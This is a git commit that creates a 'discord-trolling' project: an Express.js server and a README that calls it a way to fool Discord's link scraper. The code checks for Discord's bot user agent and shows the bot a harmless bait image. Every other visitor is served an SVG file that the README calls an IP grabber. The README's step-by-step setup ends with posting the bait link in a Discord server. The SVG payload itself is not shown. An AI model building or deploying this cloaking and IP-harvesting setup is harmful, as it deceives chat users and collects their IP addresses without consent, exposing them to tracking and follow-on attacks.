97e59ab614e901391fe07131413faa6b44ac28f4
0xDarkTwo <115444279+0xDarkTwo@users.noreply.github.com>
2022-11-12 22:52:34 -0500

    Initial commit

---
+++ README.md
@@ -0,0 +1,10 @@
+# discord-trolling
+ Simple Express.js server to fool the Discord scraper UA into presenting a fake embed, and replacing the image with an IP grabber embedded in an SVG.
+
+# Getting Started
+
+- Replace the embed.png file with your own bait image
+
+- Run `npm install` and `npm start` to start the web server, or upload to a provider like Heroku
+
+- Paste the `https://[your-site]/embed.png` link in your discord server
---
+++ app.js
@@ -0,0 +1,61 @@
+const path = require('path');
+const express = require('express');
+const app = express();
+const fs = require('fs');
+const cors = require('cors')
+
+const dir = path.join(__dirname, 'public');
+
+const mime = {
+    html: 'text/html',
+    txt: 'text/plain',
+    css: 'text/css',
+    gif: 'image/gif',
+    jpg: 'image/jpeg',
+    png: 'image/png',
+    svg: 'image/svg+xml',
+    js: 'application/javascript'
+};
+
+app.use(cors())
+
+app.options('*', cors({origin: '*'}))
+
+app.get('*', function (req, res) {
+    if(req.get('user-agent').trim() == 'Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)') {
+        var file = path.join(dir, req.path.replace(/\/$/, '/index.html'));
+        if (file.indexOf(dir + path.sep) !== 0) {
+            return res.status(403).end('Forbidden');
+        }
+        var type = mime[path.extname(file).slice(1)] || 'text/plain';
+        var s = fs.createReadStream(file);
+        s.on('open', function () {
+            res.set('Content-Type', type);
+            s.pipe(res);
+        });
+        s.on('error', function () {
+            res.set('Content-Type', 'text/plain');
+            res.status(404).end('Not found');
+        });
+    }
+    else {
+        var file = path.join(dir, 'baited.svg');
+        if (file.indexOf(dir + path.sep) !== 0) {
+            return res.status(403).end('Forbidden');
+        }
+        var type = mime[path.extname(file).slice(1)] || 'text/plain';
+        var s = fs.createReadStream(file);
+        s.on('open', function () {
+            res.set('Content-Type', type);
+            s.pipe(res);
+        });
+        s.on('error', function () {
+            res.set('Content-Type', 'text/plain');
+            res.status(404).end('Not found');
+        });
+    }
+});
+
+app.listen(process.env.PORT || 3000, function () {
+    console.log(`Listening on http://localhost/:${process.env.PORT || 3000}`);
+});
